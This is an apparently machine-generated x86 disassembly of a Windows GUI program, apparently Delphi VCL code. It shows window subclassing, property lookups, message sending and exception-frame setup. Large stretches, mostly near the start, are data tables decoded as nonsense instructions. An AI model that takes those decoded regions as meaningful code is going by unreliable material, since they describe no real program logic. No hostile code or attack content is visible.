add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
mov esi 0x4004492
insb
push edi
inc esp
add [ esi + 0x4004492 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 4 ] ch
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
push esp
dec ecx
insd
dec esi
popad
insd
mov eax eax
enter 0x448d 0x0
or cl [ eax ]
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
sub al 0x8e
inc esp
add [ ebx ] al
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ edi + esi * 8 + 0x40b40044 ] dh
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
outsd
insb
jae r-xdata
inc esp
add al dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x70 ] al
add [ eax ] al
add [ eax ] al
sub al 0x90
add bh bh
jmp [ edi + ecx * 4 + 0x44 ]
sub_448b3f
leave
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54030003 ] al
outsd
jo r-xdata
imul esp [ edi + 0x68 ] 0x4477f474
add [ eax ] bh
add bh bh
cwde
rol [ eax + eax + 0x1 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
adc [ eax ] al
dec eax
add [ eax ] al
dec [ eax - 0x37 ]
push esp
0x44
jae r-xdata
add bh bh
hlt
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec esp
add [ eax ] al
[ ecx + ecx * 8 + 0x44 ]
add [ eax ] al
add [ ebx ] 0x0
add edx [ edi + ebp * 2 + 0x70 ]
cmp al 0x10
inc eax
add [ eax ] cl
add bh bh
dec eax
leave
adc [ eax ] al
add [ eax ] 0x0
inc [ eax - 0x37010000 ]
int1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx * 4 + 0x240044 ] cl
jns r-xdata
add [ eax + ebx * 4 - 0x3fafffbb ] dh
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
in al dx
jl r-xdata
add [ eax + eax ] ah
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
dec [ eax ]

add [ esp + edx * 2 ] ecx
inc edx
outsd
jb r-xdata
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
inc esp
add ah bl
cwde
inc ebp
add [ edi + esi * 8 - 0x3e37ffbc ] ah
inc esp
add [ eax + eax * 8 - 0x66d3ffbc ] al
inc ebp
add [ eax - 0x67 ] al
inc ebp
add [ eax + eax * 8 - 0x6697ffbc ] bh
inc ebp
add [ eax ] bl
rol [ eax + eax + 0x70 ] 0x99
inc ebp
add [ eax ] bh
rol [ eax + eax + 0x78 ] 0x99
inc ebp
add [ edi + esi * 8 - 0x3dd3ffbc ] ch
inc esp
add [ edx + eax * 8 + 0x44 ] ch
add [ eax - 0x3f ] bl
inc esp
add [ ecx + ebx * 4 - 0x666fffbb ] cl
inc ebp
add [ ecx + eax * 8 + 0x44 ] bh
add ah ch
mov esi 0x54150044
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x8d28c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ ecx * 4 + 0x69090044 ] ah
insd
inc esp
imul esi [ ebx + 0x61 ] 0x7656c62
cwde
inc ebp
add [ eax - 0x40 ] dl
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al 0xf
inc edx
add [ eax - 0x1bffbb09 ] al
cmovb eax [ eax ]
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
mov es [ eax + eax + 0x3 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ eax ] ch
mov es [ eax + eax + 0x6 ]
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
lea eax [ eax + eax + 0x6 ]
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
push ebx
dec eax
popad
outsb
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ esi + ecx * 4 + 0x62060044 ] al
imul ecx [ esi + 0x6f ] 0x6e
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
mov es [ eax + eax + 0x6 ]
nop
outsd
insb
jae r-xdata
mov eax eax
int3
outsb
je r-xdata
inc ebx
outsd
mov es [ eax + eax - 0x75 ]
ror [ eax + 0x300448e ] 0xa
push esp
inc edx
jbe r-xdata
sub [ esi - 0x3f74ffbc ] cl
mov [ esi + 0xa030044 ] cl
add [ eax ] ebp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
ror ah 0x8e
inc esp
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
sar [ eax + 0xa00448d ] 0x8
add al [ eax ]
add [ eax + ecx * 4 ] dh
inc esp
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
mov esi 0x4004492
insb
push edi
inc esp
add [ esi + 0x4004492 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 4 ] ch
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
push esp
dec ecx
insd
dec esi
popad
insd
mov eax eax
enter 0x448d 0x0
or cl [ eax ]
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
sub al 0x8e
inc esp
add [ ebx ] al
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ edi + esi * 8 + 0x40b40044 ] dh
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
outsd
insb
jae r-xdata
inc esp
add al dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x70 ] al
add [ eax ] al
add [ eax ] al
sub al 0x90
add bh bh
jmp [ edi + ecx * 4 + 0x44 ]
sub_448fba
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_44935a
inc esp
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add al dl
dec esp
inc ebp
add [ eax ] dl
loope r-xdata
add al cl
hlt
add [ ecx ] cl
inc esp
add ah bl
loope r-xdata
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 + 0x4e140044 ] dh
inc ebp
add [ ecx ] al
add [ edi ] cl
add [ ebp + ecx * 2 + 0x45 ] ch
add [ edi ] cl
push esp
inc edi
jb r-xdata
add al dl
les eax [ eax + eax + 0x14 ]
int3
inc esp
add ah al
push cs
jo r-xdata
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
add [ eax ] bl
or [ edx ] al
in al dx
imul esp [ ebx + 0x43 ] 0x72746e6f
outsd
insb
in al dx
xchg ebx eax
inc esp
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
lodsb [ esi ]
push edi
inc ebp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
imul esp [ ebx + 0x43 ] 0x72746e6f
outsd
insb
inc eax
xchg ebx eax
inc esp
add ah dh
mov al [ eax + eax + 0xb ]
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + 0x57 ] dl
inc ebp
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
outsd
insb
jae r-xdata
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
add [ ebx + 0x449460c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6b ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx * 4 - 0x6acbffbc ] ch
inc esp
add [ edx + eax ] cl
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
sub_449396
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0xc ] cl
in al 0x44
add al cl
hlt
sub_4494b6
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_449612
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_4499dc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x9a
inc esp
add [ eax ] ch
add [ eax ] al
add [ eax - 0x27ffbff0 ] dh
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_449acc
lodsb [ esi ]
0x9ab60044 0x44
rcr [ edx - 0x65ceffbc ] 0x44
add [ ecx ] bh
0x9a410044 0x44
dec ecx
0x9a560044 0x44
arpl [ edx - 0x658fffbc ] bx
inc esp
add [ ebp - 0x66 ] bh
inc esp
add [ edx - 0x68ffbb66 ] cl
0x9aa40044 0x44
add [ eax ] eax
add [ eax ] al
jns r-xdata
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffff9acce870 ] eax
inc esp
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0x65 ] dh
inc esp
add [ ebx + ebx * 4 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 4 + 0x780044 ] bl
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
fdiv [ ebx ]
inc eax
add [ eax + ebx * 2 ] cl
inc eax
add [ eax ] bl
pop eax
inc eax
add ah ch
xor eax [ eax ]
loopne r-xdata
pop edi
inc ebp
add [ esi + ebp * 2 ] cl
inc ebp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
inc eax
add [ eax ] ch
pop eax
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x61000045 ] ch
inc ebp
add [ eax + 0x62 ] bh
inc ebp
add [ eax + 0x48004562 ] cl
push 0x45
add [ eax ] dh
insd
inc ebp
add [ eax + 0x6f ] dh
inc ebp
add [ ecx + esi * 2 + 0x45 ] dh
add [ eax + 0x76 ] bh
inc ebp
add [ esp + esi * 2 ] ch
inc ebp
add [ edi + ebx * 2 + 0x45 ] al
add [ eax ] al
push eax
popfd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
popfd
inc esp
add [ eax ] cl
add al [ eax ]
add [ eax ] bl
pop [ eax + eax - 0x3c ]
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ edi + esi * 8 + 0x40b40044 ] dh
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
mov eax eax
hlt
sub_449bac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_449c9e
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_449e1e
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_449f2c
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_449fe4
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_44a018
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4043e0
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_449fe4
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_44a074
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_44a258
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c4c8
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404440
mov eax edi
mov edx esi
call sub_403f74
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a29c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c4c8
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404440
mov eax edi
mov edx esi
call sub_403f74
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a2e0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_44e340
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44a35c
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
jne r-xdata
mov eax ebx
call sub_453a88
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_44a408
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_418470
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_44a43c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453a88
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_44a464
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026dc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_44a43c
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_44a408
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418314
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4184ec
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a4c0
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_418348
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418470
mov edx 0x8
call sub_4026fc
inc esi
dec ebx
jne r-xdata
sub_44a4f4
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_418470
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_44a408
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_44a558
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_44a5b8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4030e0
mov edx esp
mov eax esi
call sub_404184
add esp 0x100
pop esi
pop ebx
retn
sub_44a5f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44a6be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_44b714
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_44b09c
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b00
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_44b09c
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_44b714
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_44b09c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_44b714
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_44a6c3
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d2bc
call sub_4039d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_44b714
sub_44a71c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403670#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44a7ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a558
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_44a7d8
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_40338c
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_44a804
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
